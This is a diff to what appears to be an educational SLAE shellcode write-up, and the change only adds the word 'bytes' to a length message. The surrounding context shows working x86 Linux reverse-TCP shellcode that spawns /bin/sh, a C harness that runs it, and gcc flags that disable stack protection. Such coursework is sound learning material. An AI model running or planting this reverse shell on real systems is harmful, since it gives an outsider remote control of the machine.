@@ -724,7 +724,7 @@ unsigned char code[] =
 "\x81\xf7\x80\xff\xff\xfe\x57\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x03"
 "\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xd3\x49\xb0\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73"
 "\x68\x68\x2f\x2f\x62\x69\x88\x44\x24\x0b\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
-    printf("Shellcode length: %d\n", strlen(code));
+    printf("Shellcode length: %d bytes\n", strlen(code));
 
     void (*s)() = (void *)code;
     s();
@@ -741,7 +741,7 @@ The C program is compiled as an executable binary with stack-protection disabled
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
 osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
-Shellcode length: 92
+Shellcode length: 92 bytes
 
 ```
 
